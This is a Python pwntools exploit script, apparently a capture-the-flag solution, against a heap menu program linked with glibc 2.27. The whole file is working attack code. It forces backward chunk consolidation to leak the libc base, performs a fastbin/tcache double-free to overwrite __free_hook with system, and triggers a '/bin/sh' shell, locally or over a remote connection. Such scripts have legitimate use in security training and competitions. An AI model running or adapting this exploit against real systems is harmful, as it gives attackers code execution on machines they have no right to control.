from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './vuln'
libname = args.LIB if args.LIB else './libc-2.27.so'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'Your choice:', str(idx).encode())

def add(idx, sz, content):
    opt(1)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())
    sa(b'Content: ', content)

def edit(idx, content):
    pass

def show(idx):
    opt(2)
    sla(b'Index: ', str(idx).encode())

def delete(idx):
    opt(3)
    sla(b'Index: ', str(idx).encode())

def exp():
    # consolidate backward to overlap chunk
    [add(i, 0xf8, b'fill') for i in range(8)]
    add(8, 0x68, b'victim')
    add(9, 0xf8, b'trigger')
    add(10, 0x10, b'guard')
    [delete(i) for i in range(9)]
    add(8, 0x68, b'a'*0x60+p64(0x170))
    delete(9) # trigger consolidate backward

    # leak libc
    add(11, 0x78, b'/bin/sh\0')
    add(12, 0x78, b'/bin/sh\0')
    show(8)
    libc.address = u64(rl()[:-1].ljust(8, b'\x00')) - 96 - 0x3ebc40
    log.success('libc_base={}'.format(hex(libc.address)))
    
    # fastbin double-free with tcache
    add(9, 0x68, b'A')
    [add(i, 0x68, b'fill tcache') for i in range(8)] 
    [delete(i) for i in range(7)] # fulfill tcache
    delete(8)
    delete(7)
    delete(9)
    
    [add(i, 0x68, b'empty tcache') for i in range(7)]
    add(7, 0x68, p64(libc.sym.__free_hook))
    add(8, 0x68, b'/bin/sh\0')
    add(9, 0x68, b'/bin/sh\0')
    add(13, 0x68, p64(libc.sym.system))

    delete(9)
    
if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()